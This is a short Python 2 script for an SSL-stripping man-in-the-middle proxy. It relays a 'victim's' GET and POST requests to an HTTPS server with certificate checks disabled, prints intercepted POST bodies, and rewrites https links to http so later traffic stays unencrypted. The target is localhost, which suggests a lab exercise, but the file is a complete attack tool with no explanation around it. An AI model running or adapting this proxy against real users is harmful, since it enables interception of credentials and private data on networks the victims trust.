import BaseHTTPServer
import SocketServer
import ssl
import urllib2

class SSLStripProxy(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        url = 'https://localhost:4443' + self.path

        print("Intercepted GET request %s" % (url))

        # Try to fetch the GET requests from the HTTPS server and send it back to victim as HTTP
        try:
            req = urllib2.Request(url)
            for k in self.headers:
                req.add_header(k, self.headers[k])
            # Allow unverified SSL context to avoid certificate errors
            context = ssl._create_unverified_context()
            response = urllib2.urlopen(req, context=context)
            content = response.read()

            # Rewrite links from https to http
            content = content.replace('https://', 'http://')
            self.send_response(200)
            self.send_header('Content-type', response.info().getheader('Content-Type'))
            self.end_headers()
            self.wfile.write(content)
        # Raise a 502 error if the request fails
        except Exception as e:
            self.send_error(502, 'Bad gateway: {}'.format(e))

    def do_POST(self):
        url = 'https://localhost:4443' + self.path
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)

        print("Intercepted POST request %s: %s" % (url, post_data))

        # Try to fetch the POST requests from the HTTPS server and send it back to victim as HTTP
        try:
            req = urllib2.Request(url, data=post_data)
            for k in self.headers:
                req.add_header(k, self.headers[k])
            # Allow unverified SSL context to avoid certificate errors
            context = ssl._create_unverified_context()
            response = urllib2.urlopen(req, context=context)
            content = response.read()

            # Rewrite links again
            content = content.replace('https://', 'http://')
            self.send_response(200)
            self.send_header('Content-type', response.info().getheader('Content-Type'))
            self.end_headers()
            self.wfile.write(content)
        # Raise a 502 error if the request fails
        except Exception as e:
            self.send_error(502, 'Bad gateway: {}'.format(e))

httpd = SocketServer.TCPServer(("", 8080), SSLStripProxy)
print("SSL Strip Proxy running on port %d..." % 8080)
httpd.serve_forever()
